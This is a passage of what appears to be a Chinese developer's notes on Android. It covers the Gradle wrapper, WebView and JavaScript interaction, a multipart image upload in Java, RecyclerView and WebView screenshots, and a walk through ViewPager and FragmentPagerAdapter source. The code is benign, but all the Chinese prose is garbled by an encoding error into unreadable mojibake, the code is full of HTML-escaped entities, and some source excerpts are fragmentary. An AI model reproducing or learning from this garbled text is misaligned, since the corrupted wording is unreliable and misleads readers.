â””â”€wrapperè¿™é‡Œæåˆ°äº†ä¸€äº›ç‚¹ï¼šgradlew.batæ˜¯ç»™windowså¹³å°ç”¨çš„ï¼Œgradlewæ˜¯ç»™unixå¹³å°ç”¨çš„ã€‚gradle/wrapper/gradle-wrapper.jar é‡Œé¢è£…çš„æ˜¯Gradle Wrapperçš„ä»£ç gradlewå°±æ˜¯ä¸€ä¸ªè°ƒç”¨gradleå‘½ä»¤çš„è„šæœ¬ï¼Œå†…éƒ¨ä¼šæ ¹æ®gradle-wrapper.propertiesé‡Œé¢çš„distributionUrlä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„gradle distribution zipæ–‡ä»¶å¹¶è§£å‹ç¼©ï¼Œå¹¶åªä¼šä½¿ç”¨è¯¥ç‰ˆæœ¬çš„gradleè¿›è¡Œç¼–è¯‘ gradlewå°±æ˜¯å¸®å¿™å®‰è£…å¥½gradleç„¶åè°ƒç”¨gradleå…¶å®çœ‹ä¸€ä¸‹gradlewæ–‡ä»¶é‡Œé¢çš„æ³¨é‡Š: Gradle start up script for UN*Xå…¶å®å°±æ˜¯ä¸€ä¸ªbashè„šæœ¬ 23. javaå¹³å°ä¸‹æ‰«ææœ¬åœ°sambaæœåŠ¡å™¨ç”¨çš„çš„ä¸€ä¸ªlibraryå«åšimport jcifs.smb.SmbFileæ‰¾åˆ°ä¸€ä¸ªå®ä¾‹ä»£ç  24.Androidå¹³å°ä¸Šjsäº¤äº’çš„é€Ÿåº¦ä¹Ÿæ˜¯ä»åˆ«å¤„çœ‹åˆ°çš„ï¼Œè¯´æ˜¯javaè°ƒjsçš„æ•ˆç‡ä¸é«˜ï¼Œå¤§æ¦‚200msï¼Œjsè°ƒjavaå¥½ä¸€ç‚¹ï¼Œå¤§æ¦‚50mså·¦å³ï¼Œæ‰€ä»¥å°½é‡ç”¨jsè°ƒjavaã€‚ 25.åœ¨Androidå¹³å°å‘èµ·ä¸Šä¼ å›¾ç‰‡è¯·æ±‚çš„é‡ç‚¹åœ¨äºæŒæ¡httpåè®®ï¼ˆå…³é”®è¯Boundaryï¼‰è‡ªå·±ç”¨expresså†™äº†ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„åå°ï¼Œå‰ç«¯è¯·æ±‚/postæ¥å£å³å¯ä¸Šä¼ å›¾ç‰‡çœ‹äº†ä¸‹chromeé‡Œé¢çš„network POST /upload/ HTTP/1.1 Host: localhost:3000 Connection: keep-alive Content-Length: 9860 Accept: */* Origin: http://localhost:3000 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryw0ZREBdOiJbbwuAg // æ³¨æ„è¿™å¥ DNT: 1 Referer: http://localhost:3000/ Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 ------WebKitFormBoundaryw0ZREBdOiJbbwuAg Content-Disposition: form-data; name=&quot;uploads[]&quot;; filename=&quot;278a516893f31a16feee.jpg&quot; Content-Type: image/jpeg ------WebKitFormBoundaryw0ZREBdOiJbbwuAg-- é‚£ä¸ªWebKitFormBoundaryæ˜¯æµè§ˆå™¨è‡ªåŠ¨åŠ çš„ï¼ŒContent-Dispositionä¹Ÿæ˜¯æµè§ˆå™¨åŠ çš„ è¿™é‡Œå€Ÿç”¨é¸¿æ´‹çš„ä»£ç  private static final String BOUNDARY = &quot;----WebKitFormBoundaryT1HoybnYeFOGFlBR&quot;; public void uploadForm(Map&lt;String, String&gt; params, String fileFormName, File uploadFile, String newFileName, String urlStr) throws IOException { if (newFileName == null || newFileName.trim().equals(&quot;&quot;)) { newFileName = uploadFile.getName(); } StringBuilder sb = new StringBuilder(); /** * æ™®é€šçš„è¡¨å•æ•°æ® */ for (String key : params.keySet()) { sb.append(&quot;--&quot; + BOUNDARY + &quot;\\r\\n&quot;); sb.append(&quot;Content-Disposition: form-data; name=\\&quot;&quot; + key + &quot;\\&quot;&quot; + &quot;\\r\\n&quot;); sb.append(&quot;\\r\\n&quot;); sb.append(params.get(key) + &quot;\\r\\n&quot;); } /** * ä¸Šä¼ æ–‡ä»¶çš„å¤´ */ sb.append(&quot;--&quot; + BOUNDARY + &quot;\\r\\n&quot;); sb.append(&quot;Content-Disposition: form-data; name=\\&quot;&quot; + fileFormName + &quot;\\&quot;; filename=\\&quot;&quot; + newFileName + &quot;\\&quot;&quot; + &quot;\\r\\n&quot;); sb.append(&quot;Content-Type: image/jpeg&quot; + &quot;\\r\\n&quot;);// å¦‚æœæœåŠ¡å™¨ç«¯æœ‰æ–‡ä»¶ç±»å‹çš„æ ¡éªŒï¼Œå¿…é¡»æ˜ç¡®æŒ‡å®šContentType sb.append(&quot;\\r\\n&quot;); byte[] headerInfo = sb.toString().getBytes(&quot;UTF-8&quot;); byte[] endInfo = (&quot;\\r\\n--&quot; + BOUNDARY + &quot;--\\r\\n&quot;).getBytes(&quot;UTF-8&quot;); System.out.println(sb.toString()); URL url = new URL(urlStr); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.setRequestMethod(&quot;POST&quot;); conn.setRequestProperty(&quot;Content-Type&quot;, &quot;multipart/form-data; boundary=&quot; + BOUNDARY); conn.setRequestProperty(&quot;Content-Length&quot;, String .valueOf(headerInfo.length + uploadFile.length() + endInfo.length)); conn.setDoOutput(true); OutputStream out = conn.getOutputStream(); InputStream in = new FileInputStream(uploadFile); out.write(headerInfo); byte[] buf = new byte[1024]; int len; while ((len = in.read(buf)) != -1) out.write(buf, 0, len); out.write(endInfo); in.close(); out.close(); if (conn.getResponseCode() == 200) { System.out.println(&quot;ä¸Šä¼ æˆåŠŸ&quot;); } } 26.ScrollViewï¼ŒRecyclerViewçš„æˆªå±å®ç°ä¸»è¦æ˜¯ç”¨lruåŒ…è£…ä¸‹ï¼Œå‚è€ƒ public static Bitmap shotRecyclerView(RecyclerView view) { RecyclerView.Adapter adapter = view.getAdapter(); Bitmap bigBitmap = null; if (adapter != null) { int size = adapter.getItemCount(); int height = 0; Paint paint = new Paint(); int iHeight = 0; final int maxMemory = (int) (Runtime.getRuntime().maxMemory() / 1024); // Use 1/8th of the available memory for this memory cache. final int cacheSize = maxMemory / 8; LruCache&lt;String, Bitmap&gt; bitmaCache = new LruCache&lt;&gt;(cacheSize); for (int i = 0; i &lt; size; i++) { RecyclerView.ViewHolder holder = adapter.createViewHolder(view, adapter.getItemViewType(i)); adapter.onBindViewHolder(holder, i); holder.itemView.measure( View.MeasureSpec.makeMeasureSpec(view.getWidth(), View.MeasureSpec.EXACTLY), View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED)); holder.itemView.layout(0, 0, holder.itemView.getMeasuredWidth(), holder.itemView.getMeasuredHeight()); holder.itemView.setDrawingCacheEnabled(true); holder.itemView.buildDrawingCache(); Bitmap drawingCache = holder.itemView.getDrawingCache(); if (drawingCache != null) { bitmaCache.put(String.valueOf(i), drawingCache); } height += holder.itemView.getMeasuredHeight(); } bigBitmap = Bitmap.createBitmap(view.getMeasuredWidth(), height, Bitmap.Config.ARGB_8888); Canvas bigCanvas = new Canvas(bigBitmap); Drawable lBackground = view.getBackground(); if (lBackground instanceof ColorDrawable) { ColorDrawable lColorDrawable = (ColorDrawable) lBackground; int lColor = lColorDrawable.getColor(); bigCanvas.drawColor(lColor); } for (int i = 0; i &lt; size; i++) { Bitmap bitmap = bitmaCache.get(String.valueOf(i)); bigCanvas.drawBitmap(bitmap, 0f, iHeight, paint); iHeight += bitmap.getHeight(); bitmap.recycle(); } } return bigBitmap; } // æˆªå–listViewä¹Ÿæ˜¯å·®ä¸å¤šï¼Œä¸»è¦æ˜¯ä¸€ä¸ªmakeMeasureSpec View.MeasureSpec.UNSPECIFIED public static Bitmap shotListView(ListView listview) { ListAdapter adapter = listview.getAdapter(); int itemscount = adapter.getCount(); int allitemsheight = 0; List&lt;Bitmap&gt; bmps = new ArrayList&lt;Bitmap&gt;(); for (int i = 0; i &lt; itemscount; i++) { View childView = adapter.getView(i, null, listview); childView.measure( View.MeasureSpec.makeMeasureSpec(listview.getWidth(), View.MeasureSpec.EXACTLY), View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED)); childView.layout(0, 0, childView.getMeasuredWidth(), childView.getMeasuredHeight()); childView.setDrawingCacheEnabled(true); childView.buildDrawingCache(); bmps.add(childView.getDrawingCache()); allitemsheight += childView.getMeasuredHeight(); } Bitmap bigbitmap = Bitmap.createBitmap(listview.getMeasuredWidth(), allitemsheight, Bitmap.Config.ARGB_8888); Canvas bigcanvas = new Canvas(bigbitmap); Paint paint = new Paint(); int iHeight = 0; for (int i = 0; i &lt; bmps.size(); i++) { Bitmap bmp = bmps.get(i); bigcanvas.drawBitmap(bmp, 0, iHeight, paint); iHeight += bmp.getHeight(); bmp.recycle(); bmp = null; } return bigbitmap; } éƒ½åœ¨è¿™é‡Œäº† 27.æ­£å¸¸ä½¿ç”¨Android WebViewçš„æ–¹æ³•å¤§æ¦‚è¿™æ ·mWebView = findViewById(R.id.my_webview) mWebView.getSettings().setJavaScriptEnabled(true) //è¿™åªæ˜¯enable js mWebView.setWebViewClient(WebViewClient()) //æ²¡æœ‰è¿™å¥LayoutInflaterè°ƒç”¨newInstanceçš„æ—¶å€™å°±å´©äº† mWebView.loadUrl(&quot;https://www.baidu.com&quot;) å¯¹äºAndroidè°ƒç”¨JSä»£ç çš„æ–¹æ³•æœ‰2ç§ï¼š[Androidï¼šä½ è¦çš„WebViewä¸ JS äº¤äº’æ–¹å¼ éƒ½åœ¨è¿™é‡Œäº†(https://blog.csdn.net/carson_ho/article/details/64904691) é€šè¿‡WebViewçš„loadUrlï¼ˆï¼‰ é€šè¿‡WebViewçš„evaluateJavascriptï¼ˆï¼‰ // 4.4ä»¥ä¸Šå¯ç”¨ï¼Œæ•ˆç‡é«˜ä¸€ç‚¹ å¯¹äºJSè°ƒç”¨Androidä»£ç çš„æ–¹æ³•æœ‰3ç§ï¼š é€šè¿‡WebViewçš„addJavascriptInterfaceï¼ˆï¼‰è¿›è¡Œå¯¹è±¡æ˜ å°„ é€šè¿‡ WebViewClient çš„shouldOverrideUrlLoading ()æ–¹æ³•å›è°ƒæ‹¦æˆª url é€šè¿‡ WebChromeClient çš„onJsAlert()ã€onJsConfirm()ã€onJsPromptï¼ˆï¼‰æ–¹æ³•å›è°ƒæ‹¦æˆªJSå¯¹è¯æ¡†alert()ã€confirm()ã€promptï¼ˆï¼‰ æ¶ˆæ¯ ç„¶åæ˜¯WebViewçš„æˆªå± private fun screenShot() { //è¿™ç§æ–¹å¼åªèƒ½æˆªå‡ºæ¥å½“å‰å±å¹•ä¸Šæ˜¾ç¤ºçš„å†…å®¹ï¼ŒçŠ¶æ€æ ä»¥ä¸‹ï¼Œæ‰‹æœºå±å¹•åº•éƒ¨ä»¥ä¸Šçš„å†…å®¹ï¼Œä»…æ­¤è€Œå·² val screenWidth :Float = Utils.getScreenWidth(this).toFloat() val screenHeight = Utils.getScreenHeight(this).toFloat() val shortImage = Bitmap.createBitmap(screenWidth.toInt(), screenHeight.toInt(), Bitmap.Config.RGB_565) val canvas = Canvas(shortImage) // ç”»å¸ƒçš„å®½é«˜å’Œå±å¹•çš„å®½é«˜ä¿æŒä¸€è‡´ val paint = Paint() canvas.drawBitmap(shortImage, screenWidth, screenHeight, paint) mWebView.draw(canvas) savebitmap(&quot;1_awesome&quot;,shortImage) } // ç„¶è€Œä¸‹é¢è¿™ç§æ–¹å¼æˆªå‡ºæ¥çš„é•¿åº¦æ˜¯å¯¹äº†ï¼Œä½†åº•éƒ¨æ˜¯ç©ºçš„ï¼Œå¾—åˆ°çš„æ˜¯ä¸€å¼ å¾ˆé•¿çš„ï¼Œä½†é™¤äº†é¡¶éƒ¨æœ‰å½“å‰å±å¹•æ˜¾ç¤ºå†…å®¹ä»¥å¤–åº•éƒ¨ç©ºç™½çš„å›¾ç‰‡ //å°±æ˜¯åªèƒ½æˆªä¸‹æ¥å¯è§†åŒºåŸŸ private fun screenShotLong(){ mWebView.measure(View.MeasureSpec.makeMeasureSpec(View.MeasureSpec.UNSPECIFIED, View.MeasureSpec.UNSPECIFIED), View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED)) mWebView.layout(0,0,mWebView.measuredWidth,mWebView.measuredHeight) mWebView.isDrawingCacheEnabled = true mWebView.buildDrawingCache() //å›¾ç‰‡å¤§çš„è¯ï¼Œè¿™æ®µä¹Ÿå¡å¾ˆé•¿æ—¶é—´ val longBitmap = Bitmap.createBitmap(mWebView.measuredWidth,mWebView.measuredHeight,Bitmap.Config.ARGB_8888) val canvas = Canvas(longBitmap) val paint = Paint() canvas.drawBitmap(longBitmap,0f,mWebView.measuredHeight.toFloat(),paint) mWebView.draw(canvas) savebitmap(&quot;longbitmap&quot;,longBitmap) ToastUtil.showTextLong(this,&quot;All done!&quot;) } //ç„¶åæ‰¾äº†ä¸‹ï¼Œåªè¦åœ¨setContentViewå‰ï¼Œè°ƒç”¨è¿™ä¸ªæ–¹æ³•å°±okäº†ã€‚ä½†è¿™ä¸ªæ–¹æ³•å¾—åœ¨Appä¸­æ‰€æœ‰WebViewåˆ›å»ºå‰è°ƒç”¨ if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) { WebView.enableSlowWholeDocumentDraw(); } setContentView(R.layout.activity_webview); // ç„¶è€Œçœ‹åˆ°äº†è¿™æ ·çš„æ—¥å¿— // View: WebView not displayed because it is too large to fit into a software layer (or drawing cache), needs 20710080 bytes, only 8294400 available //ä¿å­˜ä¸‹æ¥çš„pngå¤§å°æ­£å¥½æ™®éåœ¨MBé‡çº§ï¼Œå¦å¤–ï¼Œä¿å­˜å›¾ç‰‡æœŸé—´å®Œå…¨å¡é¡¿ï¼ˆæŠŠcreateBitmapå’ŒsaveBitmapè¿™æ®µæŒªåˆ°å­çº¿ç¨‹å¥½ç‚¹äº†ï¼Œcpuå ç”¨25%ä»¥ä¸ŠæŒç»­10sï¼Œå†…å­˜å ç”¨ä»32MBé£™åˆ°400MBï¼Œä¸€ç›´ä¸ä¸‹æ¥äº†ï¼‰ è¿˜æœ‰,jsè°ƒjavaçš„æ—¶å€™ï¼Œèµ°çš„æ˜¯javaçš„ä¸€ä¸ªå«åšJavaBridgeçš„çº¿ç¨‹ï¼Œæ“ä½œUIçš„è¯postå°±å¥½äº†ã€‚ api 26ä¹‹åå®˜æ–¹æä¾›äº†ä¸€ä¸ªPixelCopyçš„classï¼Œæ˜¯æ¨èçš„æˆªå±æ–¹å¼ 28. åˆ†æä¸€ç‚¹ViewPagerçš„æºç é¦–å…ˆæ˜¯å¿«é€Ÿæ»‘åŠ¨çš„æ—¶å€™ä¸ºäº†æ€§èƒ½åªæ˜¯æŒªäº†bitmapï¼Œè¿™æ¯”è°ƒç”¨layoutè¦å¿«å¾—å¤šã€‚ViewPager.java private void setScrollingCacheEnabled(boolean enabled) { if (mScrollingCacheEnabled != enabled) { mScrollingCacheEnabled = enabled; if (USE_CACHE) { //è¿™ä¸ªä¸€ç›´æ˜¯false final int size = getChildCount(); for (int i = 0; i &lt; size; ++i) { final View child = getChildAt(i); if (child.getVisibility() != GONE) { child.setDrawingCacheEnabled(enabled); } } } } } // è¿™é‡Œè¦è¯´çš„æ˜¯ï¼ŒPagerAdapterä¸­å¯ä»¥å¤å†™çš„æ–¹æ³•å¾ˆå¤šï¼Œæ¯”å¦‚ä¸€äº›çŠ¶æ€çš„ä¿å­˜å°±å¯ä»¥å†™åœ¨adapterä¸­ @Override public Parcelable onSaveInstanceState() { Parcelable superState = super.onSaveInstanceState(); SavedState ss = new SavedState(superState); ss.position = mCurItem; if (mAdapter != null) { ss.adapterState = mAdapter.saveState(); } return ss; } ViewPagerçš„ onMeasureä¸­æœ‰è¿™ä¹ˆä¸€æ®µè¯,è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆviewPagerå®½é«˜ä¸èƒ½è®¾ç½®ä¸ºwrap_contentã€‚ @Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { // For simple implementation, our internal size is always 0. // We depend on the container to specify the layout size of // our view. We can&#39;t really know what it is since we will be // adding and removing different arbitrary views and do not // want the layout to change as this happens. setMeasuredDimension(getDefaultSize(0, widthMeasureSpec), getDefaultSize(0, heightMeasureSpec)); // ................................ } ViewPageræ¨ªå‘æŒªåŠ¨childçš„æ–¹æ³•æ˜¯ViewPager.java @Override public boolean onInterceptTouchEvent(MotionEvent ev) { /* * This method JUST determines whether we want to intercept the motion. * If we return true, onMotionEvent will be called and we do the actual * scrolling there. */ // è¿™é‡Œåªæ˜¯åšä¸€ä¸ªæ‹¦æˆªï¼ŒçœŸæ­£å»æŒªåŠ¨childçš„æ–¹æ³•åœ¨onTouchEventé‡Œé¢ } // Not else! Note that mIsBeingDragged can be set above. if (mIsBeingDragged) { // Scroll to follow the motion event final int activePointerIndex = ev.findPointerIndex(mActivePointerId); final float x = ev.getX(activePointerIndex); needsInvalidate |= performDrag(x); } private boolean performDrag(float x) { boolean needsInvalidate = false; scrollTo((int) scrollX, getScrollY()); //å…¶å®æ˜¯ViewPagerè‡ªå·±åœ¨æ»‘åŠ¨ pageScrolled((int) scrollX); //pageScrollViewä¸­å¹¶æœªæ¶‰åŠchildçš„æŒªåŠ¨ return needsInvalidate; } // å› ä¸ºåœ¨onLayoutä¸­æ˜¯è¿™ä¹ˆå†™çš„ï¼Œæ‰€ä»¥åé¢çš„childå…¶å®å·²ç»è¢«layoutåˆ°å±å¹•å³è¾¹æ’é˜Ÿäº†ï¼Œæ‰‹æŒ‡å¾€å·¦æ»‘åŠ¨çš„æ—¶å€™å¸¦ç€ViewPagerï¼Œç›¸å½“äºç›´æ¥æŠŠå³è¾¹çš„childrenæ‹½å‡ºæ¥äº†ã€‚ child.layout(childLeft, childTop, childLeft + child.getMeasuredWidth(), childTop + child.getMeasuredHeight()); // offsetLeftAndRightåº•å±‚çš„å®ç°æ˜¯ä¿®æ”¹displayListçš„æ•°æ®ï¼Œnativeæ–¹æ³• mLeft += offset; mRight += offset; mRenderNode.offsetLeftAndRight(offset); åœ¨smoothScrollToä¸­è¿™ä¸ªæ–¹æ³•è¢«è°ƒç”¨ï¼Œä¼ äº†ä¸€ä¸ªtrueã€‚å…¶å®ç±»ä¼¼çš„scrollCacheçš„è®¨è®ºè¿˜å¾ˆå¤šã€‚åŸç†å°±æ˜¯è°ƒç”¨æ‰€æœ‰childçš„setDrawingCacheEnabledæ–¹æ³•ï¼ˆä¸è¿‡ç›®å‰çœ‹æ¥è¿™ä¸ªå› ä¸ºUSE_CACHEä¸€ç›´æ˜¯falseæ‰€ä»¥æ²¡ç”¨ï¼‰çœ‹ViewPagerçš„æ—¶å€™åˆæƒ³åˆ°ä¸€ä»¶äº‹ï¼Œæœ€æ—©çš„æ—¶å€™ä»¥ä¸ºè¿™ç§è·Ÿadapteræ‰“äº¤é“çš„Viewä¸åº”è¯¥ç”¨setDataï¼Œåº”è¯¥ç”¨addDataï¼Œå¹¶å¤©çœŸçš„ä»¥ä¸ºå†…éƒ¨å®ç°å°±æ˜¯ç›´æ¥ä»å¤–éƒ¨çš„listä¸­å–æ•°æ®ã€‚åœ¨ViewPageræºç ä¸­ï¼Œæœ‰ä¸€ä¸ªmItemsçš„ArrayList,è¿™ä¹ˆçœ‹æ¥å®é™…ä¸Šå¤–éƒ¨çš„æ•°æ®ä¹Ÿåªæ˜¯è¢«æ‹¿æ¥å¡«å……åˆ°å†…éƒ¨çš„ä¸€ä¸ªæ–°çš„Listä¸­ã€‚ ItemInfo addNewItem(int position, int index) { ItemInfo ii = new ItemInfo(); ii.position = position; ii.object = mAdapter.instantiateItem(this, position); ii.widthFactor = mAdapter.getPageWidth(position); if (index &lt; 0 || index &gt;= mItems.size()) { mItems.add(ii); } else { mItems.add(index, ii); } return ii; } // notifyDataSetChangeæœ€ç»ˆèµ°åˆ°äº†è¿™é‡Œï¼Œå…³é”®åœ¨äºgetItemPositionè¿™ä¸ªæ–¹æ³•çš„å®ç° void dataSetChanged() { // This method only gets called if our observer is attached, so mAdapter is non-null. final int adapterCount = mAdapter.getCount(); mExpectedAdapterCount = adapterCount; boolean needPopulate = mItems.size() &lt; mOffscreenPageLimit * 2 + 1 &amp;&amp; mItems.size() &lt; adapterCount; // mOffscreenPageLimité»˜è®¤æ˜¯1 // æ¯”å¦‚åŸæ¥çš„æ•°é‡åªæœ‰2ï¼Œæˆ–è€…æ·»åŠ äº†æ–°çš„æ•°æ®ï¼Œéƒ½éœ€è¦é‡èµ°ä¸€élayout int newCurrItem = mCurItem; boolean isUpdating = false; for (int i = 0; i &lt; mItems.size(); i++) { final ItemInfo ii = mItems.get(i); final int newPos = mAdapter.getItemPosition(ii.object); if (newPos == PagerAdapter.POSITION_UNCHANGED) { continue; //è¿™ä¹Ÿå°±æ˜¯adapterä¸­getItemPositionå‘æŒ¥ä½œç”¨çš„åœ°æ–¹ï¼ŒViewPageræ›´æ–°äº†æ•°æ®ï¼Œå¦‚æœä¸å»å¤å†™è¿™ä¸ªæ–¹æ³•ï¼Œä¸‹é¢çš„destoryItemå°±æ— æ³•èµ°åˆ°(æ¯”å¦‚è¯´åˆ é™¤äº†ä¸€ä¸ªæ•°æ®å°±æ²¡æ³•åˆ æ‰è¿™ä¸ªfragment) } if (newPos == PagerAdapter.POSITION_NONE) { mItems.remove(i); i--; if (!isUpdating) { mAdapter.startUpdate(this); isUpdating = true; } mAdapter.destroyItem(this, ii.position, ii.object); needPopulate = true; if (mCurItem == ii.position) { // Keep the current item in the valid range newCurrItem = Math.max(0, Math.min(mCurItem, adapterCount - 1)); needPopulate = true; } continue; } if (ii.position != newPos) { if (ii.position == mCurItem) { // Our current item changed position. Follow it. newCurrItem = newPos; } ii.position = newPos; needPopulate = true; } } if (isUpdating) { mAdapter.finishUpdate(this); //è¿™é‡Œæ— è®ºæ˜¯FragmentPagerAdapterè¿˜æ˜¯FragmentStatePagerAdapteréƒ½åªæ˜¯è°ƒç”¨äº†transaction.commitNowAllowingStateLoss } Collections.sort(mItems, COMPARATOR); if (needPopulate) { // Reset our known page widths; populate will recompute them. final int childCount = getChildCount(); for (int i = 0; i &lt; childCount; i++) { final View child = getChildAt(i); final LayoutParams lp = (LayoutParams) child.getLayoutParams(); if (!lp.isDecor) { lp.widthFactor = 0.f; } } setCurrentItemInternal(newCurrItem, false, true); requestLayout(); } } æœ€åæ˜¯å…³äºViewPagerçš„é¢„åŠ è½½é—®é¢˜ void populate(int newCurrentItem) { if (curItem == null &amp;&amp; N &gt; 0) { curItem = addNewItem(mCurItem, curIndex); //é¦–å…ˆæ˜¯åŠ è½½å½“å‰çš„item } // Fill 3x the available width or up to the number of offscreen // pages requested to either side, whichever is larger. // If we have no current item we have no work to do. // å·¦å³ä¸¤ä¾§éƒ½æ”¾è‡³å°‘offscreenLimit*screenwidthçš„å®½åº¦ï¼Œæ‰€ä»¥å·¦å³è‡³å°‘éƒ½åŠ è½½ä¸€ä¸ª //å®é™…åŠ è½½çš„æ–¹æ³•æ˜¯åœ¨addNewItemé‡Œé¢ï¼Œ // Fill 3x the available width or up to the number of offscreen // pages requested to either side, whichever is larger. // If we have no current item we have no work to do. if (curItem != null) { float extraWidthLeft = 0.f; if(....){ addNewItem() } // .... å…ˆå¡«å……å·¦è¾¹ float extraWidthRight = curItem.widthFactor; // ...ç„¶åæ˜¯å³è¾¹ if(....){ addNewItem() } calculatePageOffsets(curItem, curIndex, oldCurInfo); } } viewPagerçš„layoutParamsæ˜¯ä¸è®¤marginçš„ï¼Œæ‰€ä»¥åŠ å·¦å³marginå¾—è¿™æ · viewPager.pageMargin = gapviewPager.clipToPadding = falseviewPager.setPadding(gap,0,gap,0) è¿˜æœ‰PagerAdapterçš„getItemPositionè¿™ä¸ªæ–¹æ³•ï¼Œè¿”å›å€¼é™äºPOSITION_UNCHANGEDï¼ŒPOSITION_NONEæˆ–è€…objectçš„newPosition(å¾ˆå¤šæ—¶å€™éƒ½å¿˜è®°å†™)fragment-state-pager-adapterViewPager ä¸ PagerAdapter åˆ·æ–°é‚£ç‚¹äº‹aospçš„issueä¸­å…³äºviewPagerçš„è®¨è®º // é‚£ä¹ˆnewPoså¯ä¸å¯ä»¥è¿”å›POSITION_UNCHANGEDå’ŒPOSITION_NONEä»¥å¤–çš„ä¸œè¥¿å‘¢ï¼Ÿreturn objectâ€™s new position index from [0, {@link #getCount()}), {@link #POSITION_UNCHANGED} if the objectâ€™s position has not changed,or {@link #POSITION_NONE} if the item is no longer present.ä»æ–¹æ³•çš„æ³¨é‡Šæ¥çœ‹å½“ç„¶æ˜¯å¯ä»¥çš„ã€‚ä»ä»£ç æ¥çœ‹ï¼Œå¦‚æœgetItemPositionè¿”å›çš„intå€¼ä¸æ˜¯POSITION_UNCHANGEDå’ŒPOSITION_NONEçš„è¯ï¼Œä¼šæŠŠè¿”å›çš„å€¼å½“åšæ–°çš„å€¼æ¥ä½¿ç”¨ï¼ŒåŒæ—¶needPopulateä¸ºtrueï¼ˆä¹Ÿå°±æ˜¯ä¼šè°ƒç”¨requestLayoutæ–¹æ³•ï¼‰æœ€ç®€å•çš„ä¾‹å­æ˜¯è¿”å›myFragments.indexOf(object) äº²æµ‹ï¼Œadapterç»§æ‰¿FragmentPagerAdapterï¼Œæ¯”æ–¹è¯´adapterä¸­æœ‰ä¸€ä¸ªListï¼Œå¦‚æœæƒ³è¦æ›¿æ¢ç¬¬0ä¸ªå’Œç¬¬1ä¸ªçš„ä½ç½®ï¼ˆè¿™ç§ä¸å±äºç»“æ„æ€§æ›¿æ¢ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥äº†val list = adapter1.myFragmentsCollections.swap(list,0,1)adapter1.notifyDataSetChanged() // è¿™é‡Œèµ°å®Œäº†å¹¶ä¸ä¼šè°ƒç”¨ä»»ä½•scrollToItemæ–¹æ³•ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦æœ‰ä¸‹é¢çš„setCurrentItempager1.setCurrentItem(0,false) //è¿™é‡Œåªæ˜¯é¿å…åŠ¨ç”» åœ¨adapterä¸­è¿™ä¸¤ä¸ªæ–¹æ³•è¦ä¿æŒä¸€è‡´æ€§ override fun getItemId(position: Int): Long { return (myFragments[position] as PagerFragment).hashCode().toLong() //è¿™é‡Œåªéœ€è¦è¿”å›ä¸€ä¸ªè¶³å¤Ÿè¡¨æ˜ç‹¬ä¸€æ— äºŒèº«ä»½çš„ä¸œè¥¿å°±å¥½äº†,hashCodeè¶³ä»¥} override fun getItemPosition(object: Any): Int {//å¦‚æœæ˜¯ä¸¤ä¸ªæ•°æ®ä¹‹é—´è°ƒæ¢äº†çš„è¯return myFragments.indexOf(object)}æ‰€ä»¥POSITION_NONEåªæ˜¯ç¡®ä¿adapterçš„destoryItemæ–¹æ³•ä¼šèµ°åˆ°æ‰€æœ‰æ—§çš„fragmentä¸Šè¿°åšæ³•é€‚ç”¨äºFragmentPagerAdapterä»¥åŠFragmentStatePagerAdapterè¿™é‡Œè¿˜ä¸å¾—ä¸æåˆ°FragmentPagerAdapterå’ŒFragmentStatePagerAdapterçš„åŒºåˆ« // FragmentPagerAdapterçš„ public Object instantiateItem(ViewGroup container, int position) { final long itemId = getItemId(position); // è¿™ä¸ªæ–¹æ³•é»˜è®¤è¿”å›äº†positionï¼Œä½†äº‹å®ä¸Šå¯ä»¥å¦‚æœåç»­æ›´æ–°äº†æŸä¸€ä¸ªpositionçš„fragmentï¼Œè¿˜æ˜¯ä¼šä½¿ç”¨ä¹‹å‰çš„fragment,è€Œä¸æ˜¯èµ°åˆ°getItemçš„é‡æ–°åˆ›å»ºitemã€‚ä¸ªäººè§‰å¾—å¯ä»¥è¿”å›ä¸€ä¸ªposition+lastUpdateTimeStampè¿™æ ·çš„Stringã€‚ä¹Ÿå°±èƒ½å®ŒæˆFragmentPagerAdapterçš„åˆ·æ–°é—®é¢˜äº† // Do we already have this fragment? String name = makeFragmentName(container.getId(), itemId); Fragment fragment = mFragmentManager.findFragmentByTag(name); if (fragment != null) { if (DEBUG) Log.v(TAG, &quot;Attaching item #&quot; + itemId + &quot;: f=&quot; + fragment); mCurTransaction.attach(fragment); } else { fragment = getItem(position); if (DEBUG) Log.v(TAG, &quot;Adding item #&quot; + itemId + &quot;: f=&quot; + fragment); mCurTransaction.add(container.getId(), fragment, makeFragmentName(container.getId(), itemId)); } } // FragmentStatePagerAdapterçš„ @Override public Object instantiateItem(ViewGroup container, int position) { // If we already have this item instantiated, there is nothing // to do. This can happen when we are restoring the entire pager // from its saved state, where the fragment manager has already // taken care of restoring the fragments we previously had instantiated. if (mFragments.size() &gt; position) { Fragment f = mFragments.get(position); if (f != null) { return f; } } if (mCurTransaction == null) { mCurTransaction = mFragmentManager.beginTransaction(); } Fragment fragment = getItem(position); if (DEBUG) Log.v(TAG, &quot;Adding item #&quot; + position + &quot;: f=&quot; + fragment); if (mSavedState.size() &gt; position) { Fragment.SavedState fss = mSavedState.get(position); if (fss != null) { fragment.setInitialSavedState(fss); } } while (mFragments.size() &lt;= position) { mFragments.add(null); } fragment.setMenuVisibility(false); fragment.setUserVisibleHint(false); mFragments.set(position, fragment); mCurTransaction.add(container.getId(), fragment); return fragment; } åœ¨AbsListViewä¸­ï¼ŒsetScrollingCacheEnabledè¿™ä¸ªæ–¹æ³•ä¹Ÿå­˜åœ¨ï¼ŒåŒæ 